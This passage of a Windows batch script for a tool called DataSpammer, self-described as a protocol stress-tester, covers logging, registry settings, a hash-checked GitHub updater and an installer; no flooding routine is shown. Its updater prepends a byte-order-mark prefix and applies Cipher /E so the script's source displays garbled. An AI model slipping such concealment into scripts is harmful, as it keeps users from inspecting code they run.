    :: Check if ANSI support is enabled
    if not "%_NCS%"=="1" (
        echo %text%
        exit /b
    )
    
    :: Set escape code
    if not defined esc (
        for /F %%a in ('echo prompt $E ^| cmd') do set "esc=%%a"
    )
    
    :: Define Colors
    set "Red=41;97m"
    set "Gray=100;97m"
    set "Green=42;97m"
    set "Blue=44;97m"
    set "White=107;91m"
    set "_Red=40;91m"
    set "_White=40;37m"
    set "_Green=40;92m"
    set "_Yellow=40;93m"
    
    :: Select Colors
    for %%F in (Red Gray Green Blue White _Red _White _Green _Yellow) do (
        if /I "%color.func%"=="%%F" (
            set "code=!%%F!"
        )
    )
    
    :: Return normal color if no match
    if not defined code (
        echo %text%
        exit /b
    )
    
    :: Color output
    <nul set /p "=!esc![!code!!emoji!!text!!esc![0m"
    echo:

    :: Reset Base Color
    if defined color ( color %color% )

    exit /b 0



:check_NCS
    :: ===============================
    :: Function: check for NCS Support
    :: ===============================
    
    set "_NCS=1"
    
    :: Get Windows Build
    set "winbuild="
    for /f "tokens=6 delims=[]. " %%G in ('ver') do set "winbuild=%%G"
    
    :: Disable NCS for Old Builds
    if %winbuild% LSS 10586 set "_NCS=0"
    
    :: Check ForceV2 from Registry
    if %winbuild% GEQ 10586 (
        reg query "HKCU\Console" /v ForceV2 %nul2% | find /i "0x0" %nul1% && (
            set "_NCS=0"
        )
    )
    
    :: Export NCS
    set "_NCS=%_NCS%"
    exit /b
    

:sys.lt
    setlocal EnableDelayedExpansion
    :: Wait for a given time, supports wait.exe
    :: Delay until execution is ca. 300-500ms 
    if exist "%~dp0\wait.exe" ( 
        set /a "wait_time=%~1 * 500"
        "%~dp0\wait.exe" -s %wait_time%ms
    )
    if /i "%~2"=="timeout" (
        %timeout% /t %~1 >nul
    )
    if /i "%~2"=="count" (
        for /L %%i in (%~1,-1,0) do (
            set "msg=Waiting, %%i seconds remaining..."
            echo !msg!
            %timeout% /t 1 >nul
        )
        echo:
    ) else (
        set /a "wait_time=%~1 * 500"
        %ping% -n 1 -w %wait_time% 127.0.0.1 >nul
    )
    endlocal
    exit /b 0

:parse.settings
    :: Parse Settings from Registry
    set "ignoreKeys=Token UsernameHash Version Installed PasswordHash"
    set "settings.count=0"
    :: Read Registry keys from HKCU\Software\DataSpammer
    for /f "skip=2 tokens=1,2,*" %%A in ('reg query "HKCU\Software\DataSpammer" 2^>nul') do (
        set "key=%%A"
        set "value=%%C"
        
        set "ignore=false"
        for %%k in (%ignoreKeys%) do (
            if /i "!key!"=="%%k" set "ignore=true"
        )

        if /i "!ignore!"=="false" (
            set "!key!=!value!"
            set /a "settings.count+=1"
        )
    )
     
    if not defined logging set "logging=1"
    if not defined elevation set "elevation=pwsh"
    if not defined verbose set "verbose=0"
    if not defined color set "color=0F"

    for /f "tokens=2 delims=:" %%A in ('chcp') do (
        set "chcp.value=%%A"
    )
    set "chcp.value=!chcp.value: =!"
    set "chcp.clean=!chcp.value:.=!"
    if not defined chcp set "chcp=!chcp.clean!"

    call :color _Green "Successfully parsed %settings.count% settings from the registry."
    exit /b 0

:log
    :: call scheme is:
    :: call :log Opened_verify_tab ( ERROR, INFO etc.) <- OPTIONAL
    :: Use INFO for normal Actions e.g. Opened Menu Foo Bar
    :: Use ERROR for Errors
    :: Use WARN for Impactful Actions e.g. Changed Setting Foo Bar
    :: Use DEBUG for Debugging
    :: Custom Log Levels can be added
    :: In the Logfile _ and - are replaced with Spaces
    if "%logging%"=="0" exit /b 0
    if "%monitoring%"=="1" call :send_message "%log.content%"

    if "%logging%"==2 if "%~2"=="INFO" exit /b 0

    :: Log with Emoji
    if "%chcp%"=="65001" (
        if "%~2"=="WARN" (
            set "emoji_log=⚠️ %~2"
        ) else if "%~2"=="ERROR" (
            set "emoji_log=❌ %~2"
        ) else if "%~2"=="INFO" (
            set "emoji_log=ℹ️ %~2"
        ) else (
            set "emoji_log=%~2"
        )
    ) else (
        set "emoji_log=%~2"
    )

    call :check_args :log "%~1"
    set "log.content=%~1"
    set "logfile=DataSpammer.log"
    
    if "%errorlevel%"=="1" ( set "log.content=ERROR" )

    :: Check Folder Structure
    set "folder=%userprofile%\Documents\DataSpammerLog"
    if not exist "%folder%" (
        mkdir "%folder%"
    )
    
    set "log.content.clean=%log.content%"
    set log.content.clean=%log.content.clean:_= %
    set log.content.clean=%log.content.clean:-= %


    for /f "tokens=1-3 delims=:." %%a in ("%time%") do set formatted_time=%%a:%%b:%%c
    echo [ DataSpammer / %emoji_log% ][%date% - %formatted_time%]: %log.content.clean% >> "%folder%\%logfile%"
    :: If Verbose is On Display Log to Screen
    if "%verbose%"=="1" echo Writing Log: [ DataSpammer / %emoji_log% ][%date% - %formatted_time%]: %log.content.clean%
    exit /b %errorlevel%
    


:update_config
    :: Example for Interactive Change
    :: call :update_config "default-filename" "Type in the Filename you want to use." ""
    
    :: Example for Automated Change
    :: call :update_config "logging" "" "1"
    
    :: Parameter 1: Value (logging etc.)
    :: Parameter 2: User Choice (interactive prompt, empty for automated)
    :: Parameter 3: New Value (leave empty for user input)
    call :check_args :done "%~1" "%~2" "%~3"
    if "!errorlevel!"=="1" (
        !errormsg!
        exit /b 1
    )

    set "key=%~1"
    set "prompt=%~2"
    set "new_value=%~3"

    if "%new_value%"=="" (
        set /p "new_value=!prompt! "
    )

    reg add "HKCU\Software\DataSpammer" /v "%key%" /t REG_SZ /d "%new_value%" /f >nul
    if "!logging!"=="1" call :log Changed_%key% WARN

    :: Check if the registry command was successful
    if errorlevel 1 (
        %errormsg%
        call :color _Red "Error updating registry key %key%." error
        exit /b 1
    ) else (
        call :color _Green "Successfully updated %key% to '%new_value%.'" okay
    )

    exit /b 0

:done
    :: Display Done Window
    call :check_args :done "%~1"
    if "%errorlevel%"=="1" (
        %errormsg%
    )
    %cls.debug%
    echo:
    %$Echo% "   ____        _        ____                                           
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  
    %$Echo% "                             |_|                                                                    


    
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo %~1
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo Do you want to Close the Script or Go to the Menu?
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Close
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Menu
    echo:
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto cancel
        if %_erl%==2 goto menu
    goto done

:list.vars
    :: List all Goto Signs
    cd "%~dp0"
    echo ---------------
    echo DataSpammer.bat
    echo ---------------

    for /f "delims=" %%a in ('findstr /b ":" "dataspammer.bat" ^| findstr /v "^::" ^| findstr /v "^:REM"') do (
    echo %%a
    )
    pause

:send_message
    :: Send a Message to Monitor Socket
    if "%monitoring%" NEQ "1" exit /b monitoroff
    set "socket.location=%TEMP%\socket.message"
    set "message=%~1 %~2 %~3 %~4 %~5 %~6 %~7 %~8 %~9"
    echo %message% > "%socket.location%"
    exit /b

:help.startup
    :: Display Help Message
    echo:
    echo:
    echo Dataspammer: 
    echo    Script to stress-test various Protocols or Systems
    echo    For educational purposes only.
    echo:
    echo Usage dataspammer [Argument] 
    echo       dataspammer.bat [Argument]
    echo:
    echo Parameters: 
    echo    help    Show this Help Dialog
    echo:
    echo    update  Check for Updates and exit afterwards
    echo:
    echo    faststart   Start the Script without checking for Anything 
    echo:
    echo    remove  Remove the Script and its components from your System
    echo:
    echo    start   Directly start a Spam Method
    echo:
    echo    noelev  Start the Script without Administrator
    echo:
    echo    debug   Generate Debug Log (Requires Admin / UAC)
    echo:
    echo    monitor     Opens the Monitor Socket
    echo:
    echo    update.script     Force Update the Script
    echo:
    echo    version     Show Version
    echo:
    echo    debugtest       Verify Functionality
    echo:
    echo    install       Start the Installer
    echo:
    echo    /b      Exit while keeping CMD Window (can be combined with other Arguments)
    echo:
    echo    /v      Show Verbose Output (can be combined with other Arguments)
    echo:
    echo:
    exit /b %errorlevel%

:update.script
    %cls.debug%
    :: Updated in v6
    :: Old one used seperate file / wget & curl & iwr
    if %logging% == 1 ( call :log Creating_Update_Script INFO )
    
    set "api_url=https://api.github.com/repos/PIRANY1/DataSpammer/releases/latest"
    curl -s %api_url% > apianswer.txt
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_release_tag=%%a"
    )

    set "update_url=https://github.com/PIRANY1/DataSpammer/releases/download/%latest_release_tag%/"

    cd /d "%~dp0"
    erase README.md && erase LICENSE >nul 2>&1
    set "TMP_DIR=%temp%\dts.update"
    rd /s /q "%TMP_DIR%" 2>nul
    mkdir "%TMP_DIR%"


    :: Download Files via BITS
    for %%F in (dataspammer.bat README.md LICENSE) do (
        bitsadmin /transfer upd "%update_url%%%F" "%TMP_DIR%\%%F"
        if errorlevel 1 (
            %errormsg%
            call :color _Red "Download failed for %%F." error
            pause
            exit /b 1
        )
    )

    :: Download Hashes
    for %%F in (dataspammer.bat README.md LICENSE) do (
        bitsadmin /transfer upd "%update_url%%%F.hash" "%TMP_DIR%\%%F.hash"
        if errorlevel 1 (
            %errormsg%
            call :color _Red "Download failed for %%F.hash." error
            pause
            exit /b 1
        )
    )

    setlocal EnableDelayedExpansion
    set "files=dataspammer.bat readme.md license"
    set "failcount=0"

    for %%F in (%files%) do (
        :: Calculate Hash of Local Files
        certutil -hashfile "%TMP_DIR%\%%F" SHA256 > "%TMP_DIR%\%%F.calc"

        :: Parse Hash from .calc File
        for /f "delims=" %%A in ('%powershell_short% -Command "(Get-Content '%TMP_DIR%\%%F.calc' | Select-String -Pattern '([0-9a-fA-F]{64})').Matches.Groups[1].Value"') do (
            set "sha256_actual=%%A"
        )

        :: Pull Hash from Remote File
        for /f "delims=" %%A in ('%powershell_short% -Command "(Get-Content '%TMP_DIR%\%%F.hash' | Select-String -Pattern '([0-9a-fA-F]{64})').Matches.Groups[1].Value"') do (
            set "sha256_expected=%%A"
        )

        :: Compare
        if /i "!sha256_actual!" neq "!sha256_expected!" (
            %errormsg%
            echo Hash mismatch at %%F:
            echo    Expected: !sha256_expected!
            echo    Found   : !sha256_actual!
            echo Download Failed.
            pause
            set /a failcount+=1
        ) else (
            echo %%F OK!
        )
    )

    if !failcount! gtr 0 (
        %errormsg%
        call :color _Red "Hash Check failed for !failcount! files." error
        call :color _Red "Exiting Updater." error
        pause
        goto cancel
    ) else (
        call :color _Green "All files passed the Hash Check." okay
    )

    :: Check for Certutil, Required for Encryption
    for /f "delims=" %%a in ('where certutil') do (
        set "where_output=%%a"
    )  

    if not defined where_output goto move.new.files
    :: Encrypt new Files, when current Version is already encrypted
    reg query "HKCU\Software\DataSpammer" /v Token >nul 2>&1 || goto move.new.files

    echo Encrypting newly downloaded Files...
    echo FF FE 0D 0A 63 6C 73 0D 0A >  "%temp%\dts.update\temp_hex.txt"
    certutil -f -decodehex "%temp%\dts.update\temp_hex.txt" "%temp%\dts.update\temp_prefix.bin"
    move "%temp%\dts.update\dataspammer.bat" "%temp%\dts.update\original_dataspammer.bat"
    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_dataspammer.bat" "%temp%\dts.update\dataspammer.bat"
    erase "%temp%\dts.update\original_dataspammer.bat"
    erase "%temp%\dts.update\temp_hex.txt"
    erase "%temp%\dts.update\temp_prefix.bin"
    Cipher /E "%temp%\dts.update\dataspammer.bat"

    :move.new.files
    move /Y "%TMP_DIR%\dataspammer.bat" "%~dp0dataspammer.bat"
    move /Y "%TMP_DIR%\README.md" "%~dp0README.md"
    move /Y "%TMP_DIR%\LICENSE" "%~dp0LICENSE"
    rd /s /q "%TMP_DIR%"
    start %elevPath% cmd.exe /c "%~f0" update-install
    goto cancel


:version
    :: Fast Extract Version
    cd "%temp%"
    set "api_url=https://api.github.com/repos/PIRANY1/DataSpammer/releases/latest"
    curl -s %api_url% > apianswer.txt
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"
    del apianswer.txt
    echo DataSpammer Script
    echo Version v6 (Beta)
    echo Newest Stable Release: %latest_version%
    echo: 
    exit /b %errorlevel%


:: Function description:
:: %1: type (numbers, letters, all)
:: %2: number of characters to generate
:: Example: 
:: call :generate_random all 40
:: Output: Random string: fjELw0oV2nA.nDgx4Jk1vNal,2sMS8tSYhDYAP9-
:generate_random
    call :check_args :generate_random "%~1" "%~2"
    if "%errorlevel%"=="1" (
        set "random_gen=ERROR"
        exit /b 1
    )    
    setlocal EnableDelayedExpansion
    set "type=%~1"
    set "length=%~2"
    
    :: Define allowed characters based on type
    if /I "%type%"=="numbers" (
        set "chars=0123456789"
    ) else if /I "%type%"=="letters" (
        set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    ) else if /I "%type%"=="all" (
        set "chars=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz:,.-;!?"
    ) else (
        echo Unknown type: %type%
        if "%logging%"=="1" call :log Unknown_Type_%type% ERROR
        if "%logging%"=="1" call :log Caught_At_:generate_random ERROR
        exit /b 1
    )
    
    :: Escape quotes properly in PowerShell call
    set "pscmd=powershell -NoProfile -Command \""
    set "pscmd=!pscmd!$chars='!chars!'; "
    set "pscmd=!pscmd!$len=%length%; "
    set "pscmd=!pscmd!(-join (1..$len | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] }))"
    set "pscmd=!pscmd!\""
    
    for /f "usebackq delims=" %%a in (`!pscmd!`) do (
        set "random_gen=%%a"
    )
    set "random_gen=%random_gen%"
    exit /b 0

:check_args
    :: %1 = Origin (for logging)
    :: %2+ = Arguments to check
    :: Example: call :check_args :generate_random %1 %2 ...
    
    set "i=2"
    
    :check_loop
    call set "arg=%%~%i%%"
    if "!arg!"=="" (
        %errormsg%
        echo [Error][%~1] Argument #%i% is missing. Please report this Issue on GitHub.
        echo Waiting 2 Seconds...
        call :sys.lt 4 
        if defined logging if "!logging!"=="1" (
            call :log Caught_Error: ERROR
            call :log At_:check_args ERROR
            call :log From:_%~1_#%i%_is_missing ERROR
        )
        exit /b 1
    )
    
    set /a i+=1
    call set "next=%%~%i%%"
    if defined next (
        goto :check_loop
    )
    exit /b 0
    
:: -------------------------------------------------------------------
:: Function Usage Example: TimeDifference
::
:: Description:
::   Calculates the absolute time difference between two given timestamps
::   in the format HH:MM:SS,CC (%time% format).
::
:: Arguments:
::   %1 - Start time (e.g. "21:32:22,32")
::   %2 - End time   (e.g. "21:50:22,32")
::
:: Example call:
::   call :TimeDifference "21:32:22,32" "21:50:22,32" > tmp_time.txt
::
:: Output:
::   The result (duration in MM:SS:CC format) will be written to the file "tmp_time.txt".
::   It can be loaded into a variable like this:
::       set /p diff.full=<tmp_time.txt
::       del tmp_time.txt
::
:: Example Output:
::   Diff : 18:00:00
::
:: Note:
::   This function uses only standard batch features and works even
::   when times cross over a minute/hour, but not midnight.
:: -------------------------------------------------------------------

:TimeDifference
    setlocal EnableDelayedExpansion
    call :check_args :TimeDifference "%~1" "%~2"
    if "%errorlevel%"=="1" (
        %errormsg%
        exit /b 1
    )

    :: Parse time1
    set "time1=%~1"
    set "H1=%time1:~0,2%"
    set "M1=%time1:~3,2%"
    set "S1=%time1:~6,2%"
    set "C1=%time1:~9,2%"

    :: Parse time2
    set "time2=%~2"
    set "H2=%time2:~0,2%"
    set "M2=%time2:~3,2%"
    set "S2=%time2:~6,2%"
    set "C2=%time2:~9,2%"

    :: Convert to centiseconds
    set /a total1 = (1%H1% %% 100)*360000 + (1%M1% %% 100)*6000 + (1%S1% %% 100)*100 + (1%C1% %% 100)
    set /a total2 = (1%H2% %% 100)*360000 + (1%M2% %% 100)*6000 + (1%S2% %% 100)*100 + (1%C2% %% 100)

    :: Difference
    if !total2! GEQ !total1! (
        set /a diff = total2 - total1
    ) else (
        set /a diff = total1 - total2
    )

    :: Breakdown
    set /a diffMin = diff / 6000
    set /a remainder = diff %% 6000
    set /a diffSec = remainder / 100
    set /a diffCent = remainder %% 100

    :: Format 2-digit
    if !diffMin! LSS 10 set "diffMin=0!diffMin!"
    if !diffSec! LSS 10 set "diffSec=0!diffSec!"
    if !diffCent! LSS 10 set "diffCent=0!diffCent!"

    :: Output
    echo !diffMin!:!diffSec!:!diffCent!
    exit /b

:: -------------------------------------------------------------------
:: Calculates the difference in milliseconds between two time strings.
:: Input needs to be in the specified Format (or from %time%)
:: Arguments:
::   %1 - Start time (e.g. "21:32:22,32")
::   %2 - End time   (e.g. "21:50:22,32")
:: Output:
::   Sets the variable 'timeDiffMs' to the difference in milliseconds.
::
:: Example: 
:: call :TimeDiffInMs "21:32:22,32" "21:50:22,32"
:: echo Time difference: %timeDiffMs% ms
:: exit /b 0
:: -------------------------------------------------------------------
:TimeDiffInMs
    call :check_args :TimeDiffInMs "%~1" "%~2"
    if "%errorlevel%"=="1" (
        set "timeDiffMs=ERROR"
        exit /b 1
    )

    set "start=%~1"
    set "end=%~2"

    :: Check for delimiter (, or .)
    echo(%start% | find "," >nul && set "delim=," || set "delim=."

    for /f "tokens=1-4 delims=:%%delim%%" %%a in ("%start%") do (
        set /a "startMs = (((%%a * 60 + %%b) * 60 + %%c) * 1000 + %%d * 10)"
    )

    for /f "tokens=1-4 delims=:%%delim%%" %%a in ("%end%") do (
        set /a "endMs = (((%%a * 60 + %%b) * 60 + %%c) * 1000 + %%d * 10)"
    )

    set /a "timeDiffMs=endMs - startMs"
    exit /b


:loading.animation
    :: Display Loading Animation, currently unused
    set "count=%~1"
    set "wait=1"
    set "spinner=|/-\"
    
    :main_loop
    for /L %%C in (1,1,%count%) do (
        for %%A in (0 1 2 3) do (
            %cls.debug%
            set "char=!spinner:~%%A,1!"
            echo !char!
            powershell -command "Start-Sleep -Milliseconds %wait%"
        )
    )
    exit /b

:standby
    :: Display Standby Screen & Exit after 10 minutes
    %cls.debug%
    echo ==================================================
    %$Echo% "    ____  _                  _ _
    %$Echo% "   / ___|| |_ __ _ _ __   __| | |__  _   _
    %$Echo% "   \___ \| __/ _` | '_ \ / _` | '_ \| | | |
    %$Echo% "    ___) | || (_| | | | | (_| | |_) | |_| |
    %$Echo% "   |____/ \__\__,_|_| |_|\__,_|_.__/ \__, |
    %$Echo% "                                     |___/
    echo --------------------------------------------------
    echo The script has entered standby after 2 minutes of inactivity.
    echo Press any key to continue...
    echo (The script will auto-exit in 10 minutes if no key is pressed)
    echo ==================================================

    timeout /t 600 >nul
    if errorlevel 1 (
        echo Timeout reached. Exiting...
        goto cancel
    )
    
    echo Resuming...
    exit /b 0

:win.version.check
    :: Check for Windows Edition, OSType, Version and Build Number
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ProductName"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSEdition=%%X
    Set OSEdition=%OSEdition:*REG_SZ    =%
    If Defined ProgramFiles(x86) ( Set OSType=x64 ) Else ( Set OSType=x86 )
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    If %OSVersion% LSS 2009 GoTo BuildNo
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "DisplayVersion"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    :BuildNo
    Set UseExpresssion=Ver
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSBuild=%%X
    Set OSBuild=%OSBuild:*10.0.=%
    Set OSBuild=%OSBuild:~0,-1%
    
    :: %OSEdition%
    :: Type: %OSType%
    :: Version: %OSVersion%
    :: Build: %OSBuild%
    exit /b 0



:sys.verify.execution
    :: Check for Human Input by asking for random Int Input
    if %logging% == 1 ( call :log Opened_verify_tab INFO )
    if "%skip-sec%"=="1" ( exit /b %errorlevel%)
    call :generateRandom
    set "verify=%realrandom% "
    %powershell_short% -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
    set /p OUT=<%TEMP%\out.tmp
    :: Fix Empty Input Bypass
    if not defined OUT goto failed
    if %verify%==%OUT% ( goto success ) else ( goto failed )

:success
    :: Auth Success Popup
    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Success', 'DataSpammer Verify');}"
    %powershell_short% -Command %msgBoxArgs%
    exit /b

:failed
    :: Auth Failed Popup
    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered the wrong Code. Please try again', 'DataSpammer Verify');}"
    %powershell_short% -Command %msgBoxArgs%
    goto sys.verify.execution


:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: -------------------------------------------------DataSpammer.bat  <- Transition -> Install.bat----------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------

:installer.main.window
    if exist "%~dp0\install.bat" ( goto v6.port )
    :: Check Elevation
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        %powershell_short% -Command "Start-Process '%~f0' -Verb runAs"
        goto cancel
    )
    call :dataspammer.hash.check
    @title DataSpammer - Install
    %$Echo% "   ____        _        ____
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|
    %$Echo% "                             |_|


    echo Made by PIRANY - %current_script_version% - Batch
    echo:
    call :sys.lt 1
    echo This Installer will lead you through the process of installing the DataSpammer Utility.
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Use Program Files as Installation Directory 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Use Custom Directory
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Portable Install (only add required Registry Keys)
    echo: 
    call :sys.lt 1
    echo:
    echo:
    call :sys.lt 1
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 set "directory=%ProgramFiles%"
        if %_erl%==2 set /p directory=Enter the Directory:
        if %_erl%==3 goto portable.install
        if %_erl%==4 call :standby
    if not defined directory ( goto installer.main.window )

    :: Add Backslash if not present
    if not "%directory:~-1%"=="\" set "directory=%directory%\"

    cd /d "%directory%"
    :: Check RW Permissions
    call :rw.check "%directory%"
    if %errorlevel% neq 0 (
        echo Please choose a different directory.
        call :sys.lt 6
        goto installer.main.window
    )
    set "startmenushortcut=Not Included"
    set "desktopicon=Not Included"
    set "addpath=Not Included"

:installer.menu.select
    call :sys.lt 1
    echo The script will install itself in the following directory: %directory%
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] (%startmenushortcut%) Startmenu Shortcut
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [2] (%desktopicon%) Desktop Shortcut
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [3] (%addpath%) Add to Path
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Done/Skip
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] De-select All Options
    echo:
    echo:
    choice /C 12345S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 %cls.debug% && set "startmenushortcut=Included" && set "startmenushortcut1=1" && goto installer.menu.select
        if %_erl%==2 %cls.debug% && set "desktopicon=Included" && set "desktopic1=1" && goto installer.menu.select
        if %_erl%==3 %cls.debug% && set "addpath=Included" && set "addpath1=1" && goto installer.menu.select
        if %_erl%==4 goto installer.start.copy
        if %_erl%==5 set "startmenushortcut=Not Included" && set "desktopicon=Not Included" && set "addpath=Not Included" && goto installer.menu.select
        if %_erl%==6 call :standby
    goto installer.menu.select

:installer.start.copy
    :: Resync Time to avoid issues with BITS
    w32tm /resync >nul 2>&1 
    :: Main Install Code
    set "directory9=%directory%DataSpammer\"
    mkdir "%directory9%" >nul
    cd /d "%~dp0"
    copy "%~dp0dataspammer.bat" "%directory9%\" >nul 2>&1
    move "%~dp0README.md" "%directory9%\" >nul 2>&1
    move "%~dp0LICENSE" "%directory9%\" >nul 2>&1

    :: Download LICENSE and README.md if only dataspammer.bat is present
    cd /d "%directory9%"
    set "update_url=https://github.com/PIRANY1/DataSpammer/releases/download/%current_script_version%/"
    echo Downloading...
    :: Download Files via BITS
    if not exist README.md ( 
        echo Downloading README.md...
        bitsadmin /transfer upd "%update_url%README.md" "%directory9%\README.md" >nul
        if errorlevel 1 (
            %errormsg%
            echo README.md Download failed. This is not critical.
            call :sys.lt 5
        )   
    )

    if not exist LICENSE (
        echo Downloading LICENSE...
        bitsadmin /transfer upd "%update_url%LICENSE" "%directory9%\LICENSE" >nul
        if errorlevel 1 (
            %errormsg%
            echo LICENSE Download failed. This is not critical.
            call :sys.lt 5
        )  
    )

    :: Add Script to Windows App List
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    )
    reg add "%RegPath%" /v "DisplayName" /d "DataSpammer" /f >nul
    reg add "%RegPath%" /v "DisplayVersion" /d "%current_script_version%" /f >nul
    reg add "%RegPath%" /v "InstallLocation" /d "%directory9%" /f >nul
    reg add "%RegPath%" /v "Publisher" /d "PIRANY1" /f >nul
    reg add "%RegPath%" /v "UninstallString" /d "%directory9%\dataspammer.bat remove" /f >nul

    :: Add Reg Key - Remember Installed Status
    reg add "HKCU\Software\DataSpammer" /v Installed /t REG_DWORD /d 1 /f >nul
    reg add "HKCU\Software\DataSpammer" /v Version /t REG_SZ /d "%current_script_version%" /f >nul

    :: Create Startmenu Shortcut
    if defined startmenushortcut1 (
        %powershell_short% -Command "$s=New-Object -ComObject WScript.Shell;$sc=$s.CreateShortcut('%ProgramData%\Microsoft\Windows\Start Menu\Programs\DataSpammer.lnk');$sc.TargetPath='%directory9%\dataspammer.bat';$sc.Save()"
        echo Startmenu Shortcut created.
    ) >nul

    :: Create Desktop Icon w. pre defined Variables
    set "targetShortcut=%USERPROFILE%\Desktop\DataSpammer.lnk"
    set "targetPath=%directory9%\DataSpammer.bat"
    if defined desktopic1 (
        %powershell_short% -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%targetShortcut%'); $Shortcut.TargetPath = '%targetPath%'; $Shortcut.Save()"
    ) >nul 

    :: Add Script to PATH
    if defined addpath1 ( setx PATH "%PATH%;%directory9%\DataSpammer.bat" /M >nul )


:sys.main.installer.done
    :: Elevate Flag
    %cls.debug%
    echo Do you want the script to request admin rights?
    echo This is recommended and can help some features work properly.
    echo If you don't have admin rights, it's best to choose "No".
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Yes
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] No
    call :sys.lt 1
    echo:
    choice /C 12 /M "1/2:"
        set _erl=%errorlevel%
        if %_erl%==1 reg add "HKCU\Software\DataSpammer" /v "elevation" /t REG_SZ /d "pwsh" /f >nul && goto finish.installation
        if %_erl%==2 reg add "HKCU\Software\DataSpammer" /v "elevation" /t REG_SZ /d "off" /f >nul && goto finish.installation
    goto sys.main.installer.done

:finish.installation
    :: Restart Script Process 
    echo Finished Installation.
    echo Starting...
    start wt cmd.exe /c "%directory9%\dataspammer.bat"
    erase "%~dp0\dataspammer.bat" > nul
    goto cancel

:portable.install
    reg add "HKCU\Software\DataSpammer" /v Installed /t REG_DWORD /d "1" /f
    reg add "HKCU\Software\DataSpammer" /v Version /t REG_SZ /d "%current_script_version%" /f
    reg add "HKCU\Software\DataSpammer" /v logging /t REG_SZ /d "1" /f
    reg add "HKCU\Software\DataSpammer" /v color /t REG_SZ /d "0F" /f
    echo Is the Script in a directory that requires Administrative Privileges?
    choice /C YN /M "(Y)es/(N)o"
        set _erl=%errorlevel%
        if %_erl%==1 reg add "HKCU\Software\DataSpammer" /v elevation /t REG_SZ /d "pwsh" /f
        if %_erl%==2 reg add "HKCU\Software\DataSpammer" /v elevation /t REG_SZ /d "off" /f
    goto restart.script

:cancel 
    :: Exit Script, compatible with NT
